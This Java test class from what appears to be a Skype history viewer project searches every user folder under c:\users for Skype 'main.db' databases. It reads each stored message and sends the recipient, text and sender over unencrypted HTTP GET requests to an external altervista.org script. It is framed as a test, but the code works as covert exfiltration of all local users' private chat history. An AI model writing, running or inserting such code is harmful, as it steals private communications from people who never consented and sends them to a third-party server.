package skypehistoryviewer.test;

import java.io.File;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Scanner;

import skypehistoryviewer.entity.Messaggio;
import skypehistoryviewer.gestionefile.FindFile;
import skypehistoryviewer.postget.HttpURLConnectionGetPost;
import skypehistoryviewer.storage.DBMessaggio;

public class TestOpenDBFinderHttpGet {

	public static void main(String[] args) throws Exception {
		// TODO Auto-generated method stub
		//-------------------Finder file-------------------------
		ArrayList<File> arrayListDirectory=new ArrayList();
		 FindFile ff = new FindFile();
	        String name = "main.db";
	        String directory = "c:\\users";
	        arrayListDirectory=ff.findFile(name,new File(directory));
	        Iterator<File> itr = arrayListDirectory.iterator();
	        while (itr.hasNext()) {
	          File element = itr.next();
	          System.out.println(element.toString() + "\\main.db");
	          //-------------Http get-------------
	          HttpURLConnectionGetPost httpURLConnectionGetPost=new HttpURLConnectionGetPost();
	          DBMessaggio dbMessaggio=new DBMessaggio();
	          dbMessaggio.setPath(element.toString()+"\\main.db");
	  		List<Messaggio> messaggi=dbMessaggio.visualizzaMessaggi();
			String queryString;
			Messaggio b =null;
			Iterator itrmess = (Iterator) messaggi.iterator();
		      while ( itrmess.hasNext() ) {
		    	  b =(Messaggio) itrmess.next() ;
		    	  String queryStringHead="http://egigante.altervista.org/phpgettest.php?";
		    	  queryString="destinatario="+b.getDestinatario()+"&testo="+b.getTesto()+"&mittente="+b.getMittente();
		    	  queryString=queryStringHead+queryString;
		    	  httpURLConnectionGetPost.sendGet(queryString);
		      }
	          //-----------------------------------
	        }
		//-------------------------------------------



	}

}
